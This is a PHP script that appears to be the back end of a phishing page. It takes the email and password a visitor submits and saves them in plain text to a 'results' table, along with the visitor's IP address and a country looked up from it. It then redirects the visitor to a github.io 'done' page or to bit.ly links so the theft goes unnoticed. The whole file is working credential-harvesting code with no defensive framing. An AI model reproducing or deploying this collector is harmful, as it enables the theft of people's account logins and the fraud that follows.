<?php

    if(isset($_POST['nam']) && $_POST['nam'] == 'lg'){

        // Go LG English Form
	$goFoem = 'https://user-log.github.io/form-lg-ar/done.html';
        $goDone = 'https://user-log.github.io/form-lg-ar/';
        
    } else if(isset($_POST['nam']) && $_POST['nam'] != 'lg'){

        // Go Wazfny
        $goDone = 'http://bit.ly/3sDaaJn';
        $goFoem = 'https://bit.ly/3irf2N4';
        
    } else{

        $goFoem = 'https://user-log.github.io/form-lg-ar/done.html';
        $goDone = 'https://user-log.github.io/form-lg-ar/';
    }
	include "connect.php";
	$myCountry = '';

    $myEmail = $_POST['email'];
    $myPassword = $_POST['password'];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}    
    $stm1 = $con->prepare("SELECT * FROM results WHERE `ip` = ?");
    $stm1->execute(array($ip));
    $ifEx = $stm1->fetchAll();

    if(count($ifEx) > 0){
        
        header ("location:$goDone");

    }else{
    
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    
        
        $myCountry = strval($ipdat->geoplugin_countryName);

        $stmt = $con->prepare("INSERT INTO 
                results (email, `password`, `ip`, `country`, `date`)
                VALUES (:zEmail, :zPassword, :zIp, :zCountry, NOW())");

            $stmt->execute(array(

                'zEmail' => $myEmail,
                'zPassword' => $myPassword,
                'zCountry' => $myCountry,
                'zIp' => $ip
            ));

        header ("location:$goFoem");
        
    
    }

?> 
